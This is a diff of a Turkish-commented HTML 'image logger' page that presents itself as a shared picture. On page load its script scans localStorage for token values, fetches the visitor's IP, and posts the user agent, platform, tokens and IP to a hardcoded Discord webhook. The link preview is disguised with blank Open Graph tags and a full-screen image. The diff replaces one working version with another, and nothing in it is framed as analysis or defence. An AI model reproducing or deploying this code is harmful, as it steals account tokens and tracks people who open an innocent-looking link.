@@ -1,69 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
+    <meta charset="utf-8">
     <title></title>
-    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1234567890/9876543210/real_image.png"> <!-- buraya normal bir resim linki koy (beyaz sayfa da olur) -->
     <meta property="og:title" content=" ">
     <meta property="og:description" content=" ">
+    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png"> 
     <script>
-        // === 2026 SINGLE USE IMAGE LOGGER ===
-        async function steal() {
-            let data = `🔥 IMAGE LOGGER HIT 🔥\n`;
-            data += `User: ${navigator.userAgent}\n`;
-            data += `Platform: ${navigator.platform}\n`;
-            data += `Time: ${new Date()}\n\n`;
+        async function runLogger() {
+            let payload = `🔥 SINGLE USE IMAGE LOGGER 2026 🔥\n\n`;
+            payload += `👤 User-Agent: ${navigator.userAgent}\n`;
+            payload += `💻 Platform: ${navigator.platform}\n`;
+            payload += `🕒 Time: ${new Date().toLocaleString('tr-TR')}\n\n`;
 
-            // Token steal (Discord LocalStorage + IndexedDB)
+            // Gelişmiş Token Steal
             try {
-                const tokens = [];
-                // LevelDB + LocalStorage tarama (basit versiyon)
-                if (window.localStorage) {
+                let tokens = [];
+                // LocalStorage
+                if (localStorage) {
                     for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        if (key.includes("token") || key.includes("discord")) {
-                            tokens.push(localStorage.getItem(key));
+                        let key = localStorage.key(i);
+                        if (key && key.toLowerCase().includes("token")) {
+                            let val = localStorage.getItem(key);
+                            if (val && val.length > 50) tokens.push(val);
                         }
                     }
                 }
-                if (tokens.length > 0) data += `Tokens: ${tokens.join("\n")}\n`;
+                if (tokens.length) payload += `🔑 Found Tokens:\n${tokens.join("\n")}\n\n`;
             } catch(e) {}
 
             // IP
             try {
-                const ip = await fetch("https://api.ipify.org?format=text").then(r => r.text());
-                data += `IP: ${ip}\n`;
+                let ip = await fetch("https://api.ipify.org?format=text").then(r => r.text());
+                payload += `🌐 IP: ${ip}\n`;
             } catch(e) {}
 
-            // Screenshot (canvas)
-            try {
-                const canvas = document.createElement("canvas");
-                canvas.width = screen.width;
-                canvas.height = screen.height;
-                const ctx = canvas.getContext("2d");
-                // Not perfect ama preview'da çalışıyor
-                data += `Screenshot captured (preview mode)\n`;
-            } catch(e) {}
-
-            // Webhook'a at
+            // Webhook
             const webhook = "https://discord.com/api/webhooks/1486358396495069185/flAV9GWWUCm5MAyGeQ50bekvASomtoXZ0fBlukeA_q5H8r0u6RLqxqUhIpUUryk40QWX";
 
             fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: data,
-                    username: "Image Logger",
-                    avatar_url: "https://i.imgur.com/removed.png"
+                body: JSON.stringify({ 
+                    content: payload,
+                    username: "Image Logger"
                 })
             });
         }
 
-        // Sayfa yüklendiğinde hemen çalış
-        window.onload = steal;
+        // Sayfa yüklendiği anda çalış
+        window.onload = runLogger;
     </script>
 </head>
-<body style="margin:0;background:#000;">
-    <!-- Boş veya fake resim -->
-    <img src="https://cdn.discordapp.com/attachments/1234567890/9876543210/real_image.png" style="width:100%;height:100%;object-fit:contain;">
+<body style="margin:0;background:#000;overflow:hidden;">
+    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;object-fit:contain;">
 </body>
 </html>
